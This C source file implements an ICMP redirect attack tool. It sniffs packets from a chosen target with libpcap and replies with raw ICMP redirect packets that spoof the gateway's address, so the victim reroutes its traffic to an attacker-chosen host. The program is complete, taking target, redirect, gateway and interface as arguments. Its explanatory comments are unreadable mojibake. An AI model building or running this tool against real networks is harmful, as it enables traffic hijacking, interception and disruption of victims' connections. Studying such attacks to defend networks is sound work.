#include <pcap.h>
#include <time.h>
#include <stdlib.h>
#include <stdio.h>
#include<string.h> 
#include<sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h> 
#include <netinet/ip_icmp.h>
#include<unistd.h>


#define MAX 1024
#define SIZE_ETHERNET 14							//��̫��֡�ײ�����

char *TARGET_IP,*REDIRECT_IP,*GW_IP;

//target_ip Ҫ������Ŀ������ip
//redirect_ip �ض���һ���µ�ip
//gw_ip  ����ip
struct sockaddr_in target_ip, redirect_ip, gw_ip;

int flag = 0;


//ip�ײ�
struct ip_header
{
#ifdef WORDS_BIGENDIAN  
	u_int8_t version : 4;
	u_int8_t header_length : 4;
#else  
	u_int8_t header_length : 4;						//�ײ�����
	u_int8_t version : 4;							//�汾
#endif  
	u_int8_t tos;									//��������
	u_int16_t total_length;							//�ܳ���
	u_int16_t id;									//��ʶ
	u_int16_t frag_off;								//��־+��Ƭƫ��
	u_int8_t ttl;									//����ʱ��
	u_int8_t protocol;								//Э��
	u_int16_t checksum;								//�ײ�����
	struct in_addr source_address;					//ԴIP
	struct in_addr destination_address;				//Ŀ��IP
};

//icmp �ض������ײ�
struct icmp_header
{
	u_int8_t type;
	u_int8_t code;
	u_int16_t checksum;
	struct in_addr gateway_addr;					//Ŀ��·��ip
};



/*
����У���
buf����ʼ��ַ
len�����ֽ�Ϊ��λ�ĳ���
*/
u_int16_t checksum(u_int8_t *buf, int len)
{
	u_int32_t sum = 0;
	u_int16_t *cbuf;

	cbuf = (u_int16_t *)buf;						

	while (len > 1)									//ȡ16λ�Ļ������
	{
		sum += *cbuf++;
		len -= 2;
	}

	if (len)										//������Ϊ��ʱʣ���һ�ֽ�
		sum += *(u_int8_t *)cbuf;

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);

	return ~sum;
}



/*
���첢�����ض����ģ�
data����������֡���ݵ�ַ
*/
void icmp_redirect(int sockfd, const unsigned char *data, int datalen)
{
	struct sockaddr_in dest;									//������Ŀ�ĵ�ַ����������Ŀ��
	struct packet {
		struct ip_header iph;									//ip�ײ�
		struct icmp_header icmph;								//icmp�ض������ײ�
		char datas[28];											//�ض�������Ե�ԭʼip�ײ������ݲ���ǰ28�ֽ�
	}packet;


	//���ipͷ
	packet.iph.version = 4;
	packet.iph.header_length = 5;
	packet.iph.tos = 0;											//��������
	packet.iph.total_length = htons(56);						//20+8+28
	packet.iph.id = getpid();									//������??
	packet.iph.frag_off = 0;
	packet.iph.ttl = 255;										//����ʱ����Ϊ���
	packet.iph.protocol = IPPROTO_ICMP;							//ICMP��1    (tcp��6��udp:17)
	packet.iph.checksum = 0;									//������0���ڽ��м���
	packet.iph.source_address = gw_ip.sin_addr;					//Ҫα�����ط���ip����
	packet.iph.destination_address = target_ip.sin_addr;		//��α���ض���������ܺ���

	//���icmp�ײ�
	packet.icmph.type = ICMP_REDIRECT;							//����
	packet.icmph.code = ICMP_REDIR_HOST;						//����
	packet.icmph.checksum = 0;
	packet.icmph.gateway_addr = redirect_ip.sin_addr;			//�ض����µ�·��
	
	//��Դ���ݰ����ڴ��ַ����ʼ��ַ��ʼ������28���ֽڵ�Ŀ���ַ��ָ����ʼλ����
	//memcpy���Ը����κ����ͣ���strcpyֻ�ܸ����ַ���
	//dataԴ���ݰ�
	//SIZE_ETHERNET 14 ֡�ײ�����
	memcpy(packet.datas, (data + SIZE_ETHERNET), 28);

	//ip���ͽ������ײ�
	packet.iph.checksum = checksum((u_int8_t *)&packet.iph, sizeof(packet.iph));
	//ICMP���Ͱ����ײ������ݲ���
	packet.icmph.checksum = checksum((u_int8_t *)&packet.icmph, sizeof(packet.icmph) + 28);

	dest.sin_family = AF_INET;									//ip��ַ��
	dest.sin_addr = target_ip.sin_addr;							//Ŀ��ip

	//���ڷǿɿ����ӵ��������ݷ��ͣ���ΪUDP��ʽδ����SOCKET���ӣ�������Ҫ�Լ��ƶ�Ŀ��Э���ַ
	//sockfd:���Ͷ��׽���������
	//packet:���������ݵĻ�����
	//���������ݳ���:IPͷ(20)+ICMPͷ(8)+IP�ײ�(20)+IPǰ8�ֽ�
	//flag��־λ��һ��Ϊ0
	//dest:���ݷ��͵�Ŀ�ĵ�ַ
	//��ַ����
	sendto(sockfd, &packet, 56, flag, (struct sockaddr *)&dest, sizeof(dest));

	printf("a redirect packet has been sent...\n\n");
}


/*
pcap_loop()��֪����δ�����ֵ�����Է���ֵΪ��
��һ�������ǻص����������һ��������
�ڶ���������pcap.hͷ�ļ�����ģ��������ݰ�����̽��ʱ���С����Ϣ�����һ��������һ��u_charָ�룬
��������pcap_loop()��̽�������а���һ��������������ԣ�����ֹһ���ַ���������һ���ṹ��ļ��ϣ�
��һ��tcp/ip��������̫��ͷ����һ��ipͷ������tcpͷ�������д˰�����Ч�غɣ����u_char������Щ�ṹ��Ĵ����汾��
pcap��̽��ʱ������֮ǰ�������Щ�ṹ��
*/
void getPacket(u_char * arg, const struct pcap_pkthdr * pkthdr, const u_char * packet)
{
	int sockfd, res;   
	int one = 1;
	int *ptr_one = &one;

	//���Խ���Э������ΪICMP�ķ���������IP���ݰ���ͨ�ŵ���iPv4,�׽���ͨ�ŵ����ͣ�ԭʼ�׽��֣��׽������ͣ�����ICMP-��IP��
	//sockfd��socket��������Ϊ���Ժ�socket�뱾���˿�����
	if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0)
	{
		printf("create sockfd error\n");
		exit(-1);
	}

	/**
	 ����sockfd�׽��ֹ�����ѡ��
	 sockfd:ָ��һ���򿪵��׽ӿ�������
	 IPPROTO_IP��ָ��ѡ����������ΪIPV4�׽ӿ�
	 IP_HDRINCL����ϸ�������ƣ���Ҫ���ʵ�ѡ�����֣�
	 ptr_one��һ��ָ�������ָ�����ͣ�ָ��ѡ��Ҫ���õ���ֵ�Ļ�����
	 sizeof(one)��ָ���С
	*/
	res = setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, ptr_one, sizeof(one));  
	if (res < 0)
	{
		printf("error--\n");
		exit(-3);
	}

	printf("detected a packet from the target...\n");
	//����socket��������ԭʼ����֡��ַ
	icmp_redirect(sockfd, packet, 0);		
}

//������Ŀ����������̽
int setup_sniffer(char *dev)
{
	char errbuf[PCAP_ERRBUF_SIZE];

	bpf_u_int32 mask;						//��̽Ŀ�������豸dev������
	bpf_u_int32 net;						//Ŀ�������豸dev��ip

	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Can't get netmask for device %s\n", dev);
		net = 0;
		mask = 0;
	}

	//���豸������̽������һ��pcap_t���͵�ָ�룬���������Ҫ�õ����ָ��
	pcap_t * device = pcap_open_live(dev, 65535, 1, 0, errbuf);
	if (device == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(2);
	}
	//������ݰ����������ֺ������豸���ƣ����붨�岶�����ݵ�����ֽ������Ƿ����ڻ���ģʽ��
	//���ó�ʱʱ��0��ʾû�г�ʱ�ȴ���errBuf�ǳ�����NULLʱ���ڴ��ݴ�����Ϣ��

	struct bpf_program filter;
	char filterstr[50] = { 0 };
	//��Ŀ��ipƴ�ӵ������ַ�����
	sprintf(filterstr, "src host %s", inet_ntoa(target_ip.sin_addr));        

	//������ʽ����������-1Ϊʧ�ܣ���������ֵΪ�ɹ�
	//device:�Ự���
	//&filter:������Ĺ������汾�ĵ�ַ������
	//filterstr:���ʽ����,�洢�ڹ涨���ַ�����ʽ��
	//1:���ʽ�Ƿ��Ż�����������0��û�У�1����
	//net��Ӧ�ô˹���������������
	if (pcap_compile(device, &filter, filterstr, 1, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filterstr, pcap_geterr(device));
		return(2);
	}
	
	//���ù�������ʹ�����������
	pcap_setfilter(device, &filter);
	//device:�Ự���
	//&filterstr:������ı��ʽ�汾������

	printf("sniffing at %s ...\n\n", TARGET_IP);

	//device��֮ǰ���ص�pacp_t���͵�ָ��
	//-1����ѭ��ץ��ֱ�����������>0��ʾѭ��x�Σ�
	//���һ������һ��֮��Ϊnull
	pcap_loop(device, -1, getPacket, NULL);
	return 0;
}


int main(int argc, char * argv[])
{

	if (argc != 5) {
		printf("usage: %s target_ip redirect_ip gateway_ip sniff_dev \n", argv[0]);
		exit(1);
	}
	//inet_aton:��һ���ַ���IP��ַת��Ϊһ��32λ����������IP��ַ
	if (inet_aton(argv[1], &target_ip.sin_addr) == 0) {
		printf("bad ip address %s\n", argv[1]);
		exit(1);
	}
	TARGET_IP = argv[1];

	if (inet_aton(argv[2], &redirect_ip.sin_addr) == 0) {
		printf("bad ip address %s\n", argv[2]);
		exit(1);
	}
	REDIRECT_IP = argv[2];

	if (inet_aton(argv[3], &gw_ip.sin_addr) == 0) {
		printf("bad ip address %s\n", argv[3]);
		exit(1);
	}
	GW_IP = argv[3];

	char * dev = argv[4];				

	printf("target:%s\n redirect:%s\n gw:%s\n dev:%s\n\n",TARGET_IP, REDIRECT_IP, GW_IP, dev);

	setup_sniffer(dev);
}

